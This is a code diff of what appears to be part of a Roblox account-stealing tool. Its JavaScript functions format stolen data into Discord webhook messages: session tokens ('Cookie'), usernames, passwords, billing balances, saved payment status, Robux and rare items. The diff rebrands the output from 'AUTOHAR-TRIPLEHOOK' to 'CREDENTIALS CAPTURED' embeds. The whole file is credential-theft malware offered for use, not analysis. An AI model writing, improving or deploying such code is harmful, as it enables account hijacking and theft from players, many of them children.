@@ -99,71 +99,32 @@ function formatLogForDiscord(logData) {
 }
 
 function formatRobloxLoginEmbed(logData) {
-  // Check if this is a security token message
-  if (logData.message.includes('🔐 ROBLOX SECURITY TOKEN DETECTED:')) {
-    // Extract token and credentials
-    const lines = logData.message.split('\n');
-    const tokenLine = lines.find(line => line.includes('ROBLOX SECURITY TOKEN DETECTED:'));
-    const usernameLine = lines.find(line => line.includes('👤 USERNAME:'));
-    const passwordLine = lines.find(line => line.includes('🔑 PASSWORD:'));
-    
-    const token = tokenLine ? tokenLine.split(': ')[1] : 'Not captured';
-    const username = usernameLine ? usernameLine.split(': ')[1] : 'Not captured';
-    const password = passwordLine ? passwordLine.split(': ')[1] : 'Not captured';
-
-    return {
-      embeds: [
-        {
-          title: `<:emoji_37:1410520517349212200> AUTOHAR-TRIPLEHOOK`,
-          color: 0x8B5CF6,
-          fields: [
-            {
-              name: '<:emoji_37:1410520517349212200> Username',
-              value: username,
-              inline: true
-            },
-            {
-              name: '🔑 Password',
-              value: password,
-              inline: true
-            }
-          ],
-          footer: {
-            text: 'Made By .gg/sZbFX2wPVz'
-          }
-        },
-        {
-          title: `🍪 Cookie`,
-          description: `\`\`\`${token}\`\`\``,
-          color: 0x8B5CF6,
-          footer: {
-            text: 'Handle with extreme caution!'
-          }
-        }
-      ]
-    };
-  }
-
-  // Default format for other login messages
   return {
     embeds: [{
-      title: `<:emoji_37:1410520517349212200> AUTOHAR-TRIPLEHOOK`,
-      color: 0x8B5CF6,
+      title: `🔐 ROBLOX LOGIN CREDENTIALS CAPTURED`,
+      description: `\`\`\`\n${logData.message}\`\`\``,
+      color: 0xff0000, // Red for security alert
       fields: [
         {
-          name: '<:emoji_37:1410520517349212200> Username',
-          value: 'Not captured',
+          name: '🌐 URL',
+          value: logData.url || 'Unknown',
           inline: true
         },
         {
-          name: '🔑 Password',
-          value: 'Not captured',
+          name: '⏰ Timestamp',
+          value: new Date(logData.timestamp).toLocaleString(),
           inline: true
+        },
+        {
+          name: '⚠️ Security Alert',
+          value: 'Credentials and security token captured',
+          inline: false
         }
       ],
       footer: {
-        text: 'Made By .gg/sZbFX2wPVz'
-      }
+        text: `🔒 ROBLOX SECURITY BREACH DETECTED`
+      },
+      timestamp: new Date(logData.timestamp).toISOString()
     }]
   };
 }
@@ -174,84 +135,68 @@ function formatRobloxUserDataEmbed(logData) {
     
     return {
       embeds: [{
-        title: `<:emoji_37:1410520517349212200> AUTOHAR-TRIPLEHOOK`,
-        color: 0x8B5CF6,
+        title: `👤 ROBLOX USER DATA CAPTURED`,
+        color: 0x00ff00, // Green for user data
         fields: [
           {
-            name: '<:emoji_37:1410520517349212200> Username',
+            name: '👤 Username',
             value: userData.username || 'Unknown',
-            inline: false
-          },
-          {
-            name: '<:emoji_31:1410233610031857735> Robux (Pending)',
-            value: `${userData.robux || 0} (0)`,
             inline: true
           },
           {
-            name: '<:rbxPremium:1408083254531330158> Premium',
-            value: userData.premium ? 'true' : 'false',
+            name: '💰 Robux',
+            value: userData.robux?.toString() || '0',
             inline: true
           },
           {
-            name: '<:emoji_36:1410512337839849543> RAP',
-            value: userData.rap?.toString() || '0',
+            name: '⭐ Premium',
+            value: userData.isPremium ? 'Yes' : 'No',
             inline: true
           },
           {
-            name: '<:emoji_40:1410521889121501214> Summary',
-            value: userData.summary?.toString() || '0',
+            name: '📅 Account Age',
+            value: `${userData.accountAge || 0} days`,
             inline: true
           },
           {
-            name: '<a:emoji_42:1410523396995022890> Billing',
-            value: `Balance: ${userData.creditBalance && userData.creditBalance > 0 ? `$${userData.creditBalance} (Est. ${Math.round(userData.creditBalance * 80)} Robux)`: "$0"}\nSaved Payment: ${userData.savedPayment ? "True" : "False"}`,
-            inline: false
-          },
-          {
-            name: '<:emoji_31:1410233610031857735> Robux In/Out',
-            value: `<:emoji_31:1410233610031857735> ${userData.robuxIncoming || 0} / <:emoji_31:1410233610031857735> ${userData.robuxOutgoing || 0}`,
+            name: '👥 Friends',
+            value: userData.friendCount?.toString() || '0',
             inline: true
           },
           {
-            name: '<:emoji_39:1410521396420939787> Collectibles',
-            value: `${userData.korblox ? "<:KorbloxDeathspeaker:1408080747306418257> True" : "<:KorbloxDeathspeaker:1408080747306418257> False"}\n${userData.headless ? "<:HeadlessHorseman:1397192572295839806> True" : "<:HeadlessHorseman:1397192572295839806> False"}`,
+            name: '🌍 Country',
+            value: userData.country || 'Unknown',
             inline: true
           },
           {
-            name: '<:emoji_38:1410520554842361857> Groups Owned',
-            value: userData.groupsOwned?.toString() || '0',
+            name: '💀 Korblox',
+            value: userData.korblox ? 'Yes' : 'No',
             inline: true
           },
           {
-            name: '<:emoji_41:1410522675821940820> Place Visits',
-            value: userData.placeVisits?.toString() || '0',
+            name: '👻 Headless',
+            value: userData.headless ? 'Yes' : 'No',
             inline: true
           },
           {
-            name: '<:emoji_37:1410517247751094363> Inventory',
-            value: `Hairs: ${userData.inventory?.hairs || 0}\nBundles: ${userData.inventory?.bundles || 0}\nFaces: ${userData.inventory?.faces || 0}`,
-            inline: false
-          },
-          {
-            name: '<:emoji_38:1410517275328647218> Settings',
-            value: `Email Status: ${userData.emailVerified ? "Verified" : "Unverified"}\nVoice Chat: ${userData.voiceChatEnabled ? "Enabled" : "Disabled"}\nAccount Age: ${userData.accountAge || 0} Days`,
-            inline: false
+            name: '🎖️ Badges',
+            value: userData.badgeCount?.toString() || '0',
+            inline: true
           }
         ],
         footer: {
-          text: 'Made By .gg/sZbFX2wPVz'
-        }
+          text: `User ID: ${userData.userId || 'Unknown'}`
+        },
+        timestamp: new Date().toISOString()
       }]
     };
   } catch (error) {
     return {
       embeds: [{
-        title: `<:emoji_37:1410520517349212200> AUTOHAR-TRIPLEHOOK`,
+        title: `👤 ROBLOX USER DATA CAPTURED`,
         description: `\`\`\`\n${logData.message}\`\`\``,
-        color: 0x8B5CF6,
-        footer: {
-          text: 'Made By .gg/sZbFX2wPVz'
-        }
+        color: 0x00ff00,
+        timestamp: new Date().toISOString()
       }]
     };
   }
